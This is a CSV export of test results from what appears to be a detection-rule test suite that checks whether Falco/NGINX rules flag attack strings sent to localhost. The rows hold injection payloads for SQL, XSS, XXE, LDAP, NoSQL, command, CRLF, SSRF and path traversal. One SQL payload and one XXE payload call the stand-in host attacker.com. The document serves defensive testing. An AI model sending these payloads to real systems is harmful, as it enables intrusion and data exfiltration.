"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_002` |
| **Name** | MSSQL OpenRowset Data Exfil |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'sa';'pwd','SELECT 1')--`
- **Encoded**: `'%3B%20SELECT%20*%20FROM%20OPENROWSET('SQLOLEDB'%2C'attacker.com'%3B'sa'%3B'pwd'%2C'SELECT%201')--`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[082_SQLI_OOB_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_007` |
| **Name** | Window.location DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `window.location='javascript:alert(""DOM"")'`
- **Encoded**: `window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 13:44:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_007-1771076642361-12bpgb pattern_id=XSS_DOM_007 uri=/?q=window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_007-1771076642361-12bpgb pattern_id=XSS_DOM_007 uri=/?q=window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:02.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_007-1771076642361-12bpgb pattern_id=XSS_DOM_007 uri=/?q=window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[156_XSS_DOM_007]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_HEX_001` |
| **Name** | Hex Encoded UNION SELECT |
| **Category** | SQLI |
| **Subcategory** | hex_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `0x27554e494f4e2053454c454354`
- **Encoded**: `0x27554e494f4e2053454c454354`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 13:44:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_HEX_001-1771076679462-jcp5ew pattern_id=SQLI_HEX_001 uri=/?q=0x27554e494f4e2053454c454354 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_HEX_001-1771076679462-jcp5ew pattern_id=SQLI_HEX_001 uri=/?q=0x27554e494f4e2053454c454354 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:39.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_HEX_001-1771076679462-jcp5ew pattern_id=SQLI_HEX_001 uri=/?q=0x27554e494f4e2053454c454354 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[079_SQLI_HEX_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BLIND_006` |
| **Name** | LDAP Blind Injection via cn=Administrators |
| **Category** | LDAP |
| **Subcategory** | blind_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `cn=Administrators,ou=Groups`
- **Encoded**: `cn=Administrators,ou=Groups`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 13:44:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Blind injection attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Blind injection attempt test_id=LDAP_BLIND_006-1771076653343-a1wedk pattern_id=LDAP_BLIND_006 uri=/?q=cn=Administrators,ou=Groups client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Blind injection attempt test_id=LDAP_BLIND_006-1771076653343-a1wedk pattern_id=LDAP_BLIND_006 uri=/?q=cn=Administrators,ou=Groups client=127.0.0.1

**Falco Log Entry**:
```
13:44:13.000000000: Warning [NGINX LDAP Injection] Blind injection attempt test_id=LDAP_BLIND_006-1771076653343-a1wedk pattern_id=LDAP_BLIND_006 uri=/?q=cn=Administrators,ou=Groups client=127.0.0.1
```","2","test_e2e_with_logs[408_LDAP_BLIND_006]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_064` |
| **Name** | OR Command Chain |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|| id`
- **Encoded**: `%7C%7C%20id`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 13:44:27.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_ADV_064-1771076667899-ih0w1q pattern_id=CMD_ADV_064 uri=/?q=%7C%7C%20id client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_064-1771076667899-ih0w1q pattern_id=CMD_ADV_064 uri=/?q=%7C%7C%20id client=127.0.0.1

**Falco Log Entry**:
```
13:44:27.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_064-1771076667899-ih0w1q pattern_id=CMD_ADV_064 uri=/?q=%7C%7C%20id client=127.0.0.1
```","2","test_e2e_with_logs[292_CMD_ADV_064]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_014` |
| **Name** | Sleep with inline comment |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP(/*5*/5)`
- **Encoded**: `SLEEP%28/%2A5%2A/5%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~86000ms
- **Timestamp**: 13:43:47.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1771076627843-k6oczd pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1771076627843-k6oczd pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:43:47.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1771076627843-k6oczd pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[109_SQLI_TIME_014]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_002` |
| **Name** | XXE external DTD parameter entity |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd"">`
- **Encoded**: `%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 13:44:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1771076651828-gm0j1g pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1771076651828-gm0j1g pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
13:44:11.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1771076651828-gm0j1g pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[492_XXE_ENTITY_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_002` |
| **Name** | MongoDB not-equal operator bypass |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$ne"": null}`
- **Encoded**: `%7B%22%24ne%22%3A%20null%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 13:44:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1771076641828-79y1n8 pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1771076641828-79y1n8 pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1

**Falco Log Entry**:
```
13:44:01.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_002-1771076641828-79y1n8 pattern_id=EMRG_MONGO_002 uri=/?q=%7B%22%24ne%22%3A%20null%7D client=127.0.0.1
```","1","test_e2e_with_logs[561_EMRG_MONGO_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ENC_003` |
| **Name** | Mixed case script tag bypass |
| **Category** | XSS |
| **Subcategory** | encoding_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<ScRiPt>alert(1)</ScRiPt>`
- **Encoded**: `%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 13:43:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_003-1771076634844-041rf pattern_id=XSS_ENC_003 uri=/?q=%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_003-1771076634844-041rf pattern_id=XSS_ENC_003 uri=/?q=%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:43:54.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_003-1771076634844-041rf pattern_id=XSS_ENC_003 uri=/?q=%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[170_XSS_ENC_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_ATTR_004` |
| **Name** | LDAP Attribute Injection via mail |
| **Category** | LDAP |
| **Subcategory** | attribute_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `)(mail=admin@target.com`
- **Encoded**: `)(mail=admin@target.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 13:44:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Attribute injection attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_004-1771076652843-eumzo7 pattern_id=LDAP_ATTR_004 uri=/?q=)(mail=admin@target.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_004-1771076652843-eumzo7 pattern_id=LDAP_ATTR_004 uri=/?q=)(mail=admin@target.com client=127.0.0.1

**Falco Log Entry**:
```
13:44:12.000000000: Warning [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_004-1771076652843-eumzo7 pattern_id=LDAP_ATTR_004 uri=/?q=)(mail=admin@target.com client=127.0.0.1
```","2","test_e2e_with_logs[385_LDAP_ATTR_004]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_CLOUD_001` |
| **Name** | AWS IMDSv1 Metadata Access |
| **Category** | SSRF |
| **Subcategory** | cloud_metadata |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `http://169.254.169.254/latest/meta-data/`
- **Encoded**: `http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~17000ms
- **Timestamp**: 13:44:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_001-1771076696327-o32wyk pattern_id=SSRF_CLOUD_001 uri=/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_001-1771076696327-o32wyk pattern_id=SSRF_CLOUD_001 uri=/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F client=127.0.0.1

**Falco Log Entry**:
```
13:44:56.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_CLOUD_001-1771076696327-o32wyk pattern_id=SSRF_CLOUD_001 uri=/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F client=127.0.0.1
```","2","test_e2e_with_logs[423_SSRF_CLOUD_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_007` |
| **Name** | Network information gathering |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&& netstat -an`
- **Encoded**: `%26%26%20netstat%20-an`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 13:43:59.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1771076639334-ps87m8 pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1771076639334-ps87m8 pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1

**Falco Log Entry**:
```
13:43:59.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1771076639334-ps87m8 pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1
```","2","test_e2e_with_logs[311_CMD_BASIC_007]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_013` |
| **Name** | Semicolon with pwd command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;pwd`
- **Encoded**: `%3Bpwd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 13:44:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1771076642341-0jlhg pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1771076642341-0jlhg pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1

**Falco Log Entry**:
```
13:44:02.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1771076642341-0jlhg pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1
```","2","test_e2e_with_logs[317_CMD_BASIC_013]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_001` |
| **Name** | Direct absolute path to passwd file |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/etc/passwd`
- **Encoded**: `/etc/passwd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 13:43:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1771076638845-5zxspg pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1771076638845-5zxspg pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1

**Falco Log Entry**:
```
13:43:58.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_001-1771076638845-5zxspg pattern_id=PATH_ABS_001 uri=/?q=/etc/passwd client=127.0.0.1
```","2","test_e2e_with_logs[211_PATH_ABS_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_HDR_006` |
| **Name** | X-XSS-Protection Disable via CRLF |
| **Category** | CRLF |
| **Subcategory** | header_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\r\nX-XSS-Protection:0`
- **Encoded**: `%0d%0aX-XSS-Protection%3A0`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 13:45:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_006-1771076709851-rxb5up pattern_id=CRLF_HDR_006 uri=/?q=%0d%0aX-XSS-Protection%3A0 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_006-1771076709851-rxb5up pattern_id=CRLF_HDR_006 uri=/?q=%0d%0aX-XSS-Protection%3A0 client=127.0.0.1

**Falco Log Entry**:
```
13:45:09.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_HDR_006-1771076709851-rxb5up pattern_id=CRLF_HDR_006 uri=/?q=%0d%0aX-XSS-Protection%3A0 client=127.0.0.1
```","2","test_e2e_with_logs[519_CRLF_HDR_006]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_DNS_004` |
| **Name** | Octal IP Loopback SSRF Bypass |
| **Category** | SSRF |
| **Subcategory** | dns_rebinding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `http://0177.0.0.1/`
- **Encoded**: `http%3A%2F%2F0177.0.0.1%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~8000ms
- **Timestamp**: 13:45:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_004-1771076705851-vgdr0t pattern_id=SSRF_DNS_004 uri=/?q=http%3A%2F%2F0177.0.0.1%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_004-1771076705851-vgdr0t pattern_id=SSRF_DNS_004 uri=/?q=http%3A%2F%2F0177.0.0.1%2F client=127.0.0.1

**Falco Log Entry**:
```
13:45:05.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_DNS_004-1771076705851-vgdr0t pattern_id=SSRF_DNS_004 uri=/?q=http%3A%2F%2F0177.0.0.1%2F client=127.0.0.1
```","2","test_e2e_with_logs[470_SSRF_DNS_004]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_011` |
| **Name** | Mozilla CSS Binding XSS Vector |
| **Category** | XSS |
| **Subcategory** | filter_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `-moz-binding:url(evil)`
- **Encoded**: `-moz-binding:url%28evil%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 13:44:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_011-1771076668421-2fgqmq pattern_id=XSS_BYPASS_011 uri=/?q=-moz-binding:url%28evil%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_011-1771076668421-2fgqmq pattern_id=XSS_BYPASS_011 uri=/?q=-moz-binding:url%28evil%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:28.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_BYPASS_011-1771076668421-2fgqmq pattern_id=XSS_BYPASS_011 uri=/?q=-moz-binding:url%28evil%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[148_XSS_BYPASS_011]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_010` |
| **Name** | HTML comment breaking polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `--><script>alert('XSS')</script><!--`
- **Encoded**: `--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 13:44:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_010-1771076661906-zf7ti pattern_id=XSS_POLY_010 uri=/?q=--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_010-1771076661906-zf7ti pattern_id=XSS_POLY_010 uri=/?q=--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:21.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_010-1771076661906-zf7ti pattern_id=XSS_POLY_010 uri=/?q=--%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%21-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[190_XSS_POLY_010]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
